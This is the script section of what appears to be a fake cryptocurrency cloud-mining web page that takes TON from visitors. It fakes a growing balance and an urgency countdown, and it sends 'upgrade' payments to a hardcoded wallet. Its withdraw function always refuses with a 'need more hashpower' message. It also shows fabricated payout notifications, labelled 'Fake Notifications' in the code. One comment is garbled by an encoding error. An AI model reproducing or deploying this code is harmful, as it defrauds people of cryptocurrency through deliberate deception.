    <script>
        // --- SETTINGS ---
        const MY_WALLET = "UQBufh6lLHE5H1NDJXQwRIVCX-t4iKHyyoXD0Spm8N9navPx"; // ÿ∂ÿπ ÿπŸÜŸàÿßŸÜ ŸÖÿ≠ŸÅÿ∏ÿ™ŸÉ ŸáŸÜÿß

        // 1. Balance Counter
        let bal = 0;
        setInterval(() => {
            bal += 0.00000045;
            document.getElementById('balance').innerText = bal.toFixed(8);
            document.getElementById('usd-val').innerText = (bal * 5.45).toFixed(2);
        }, 100);

        // 2. Timer Logic
        let sec = 7200;
        setInterval(() => {
            let h = Math.floor(sec / 3600); let m = Math.floor((sec % 3600) / 60); let s = sec % 60;
            document.getElementById('timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
            if(sec > 0) sec--;
        }, 1000);

        // 3. Navigation
        function openTab(evt, tabName) {
            let content = document.getElementsByClassName("tab-content");
            for (let i = 0; i < content.length; i++) content[i].style.display = "none";
            let tabs = document.getElementsByClassName("nav-item");
            for (let i = 0; i < tabs.length; i++) tabs[i].classList.remove("active-tab");
            document.getElementById(tabName).style.display = "block";
            evt.currentTarget.classList.add("active-tab");
        }

        // 4. Payment Function
        function processPayment(amt, name) {
            const link = `ton://transfer/${MY_WALLET}?amount=${amt * 1000000000}&text=Upgrade+to+${name}`;
            if(confirm(`Upgrade to ${name} for ${amt} TON?`)) window.location.href = link;
        }

        // 5. Withdraw Function
        function withdrawAction() {
            alert("Minimum withdrawal is 5 TON. You need more hashpower!");
        }

        // 6. Fake Notifications
        setInterval(() => {
            const addrs = ["EQD...z92", "UQC...4b1", "EQA...7r4", "UQD...1m9"];
            document.getElementById('notif-addr').innerText = "Address: " + addrs[Math.floor(Math.random()*addrs.length)];
            document.getElementById('notif-amt').innerText = (Math.random()*20 + 5).toFixed(1) + " TON";
            let n = document.getElementById('payout-notify');
            n.style.display = "block";
            setTimeout(() => { n.style.display = "none"; }, 4000);
        }, 45000);
    </script>
